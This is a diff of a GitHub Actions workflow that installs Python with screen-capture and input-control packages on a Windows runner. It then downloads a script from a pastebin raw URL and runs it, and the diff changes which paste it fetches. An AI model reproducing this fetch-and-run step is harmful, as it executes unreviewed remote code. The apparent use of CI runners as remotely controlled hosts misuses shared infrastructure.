@@ -1,4 +1,4 @@
-name: Run Python Host (Windows)
+name: Run Python Host
 
 on:
   workflow_dispatch:
@@ -12,20 +12,11 @@ jobs:
         shell: powershell
         run: systeminfo
 
-      - name: Install 7-Zip, Python, and Go
+      - name: Install Python
         shell: powershell
         run: |
-          Write-Host "Downloading installers..."
-
-          Invoke-WebRequest "https://github.com/ip7z/7zip/releases/download/25.01/7z2501-x64.exe" -OutFile "7zip.exe"
           Invoke-WebRequest "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe" -OutFile "python.exe"
-          Invoke-WebRequest "https://go.dev/dl/go1.22.5.windows-amd64.msi" -OutFile "go.msi"
-
-          Write-Host "Installing..."
-
-          Start-Process ".\7zip.exe" -ArgumentList "/S" -Wait
           Start-Process ".\python.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
-          Start-Process "msiexec.exe" -ArgumentList "/i go.msi /quiet /norestart" -Wait
 
       - name: Install Python packages
         shell: powershell
@@ -33,20 +24,10 @@ jobs:
           python -m pip install --upgrade pip
           pip install mss pillow pynput
 
-      - name: Verify installations
-        shell: powershell
-        run: |
-          python --version
-          pip show mss
-          pip show pillow
-          pip show pynput
-          go version
-          & "${env:ProgramFiles}\7-Zip\7z.exe" i
-
       - name: Download host.py
         shell: powershell
         run: |
-          Invoke-WebRequest "https://pastebin.com/raw/dBQdeTUd" -OutFile "host.py"
+          Invoke-WebRequest "https://pastebin.com/raw/w5QNKvUp" -OutFile "host.py"
 
       - name: Run host.py
         shell: powershell
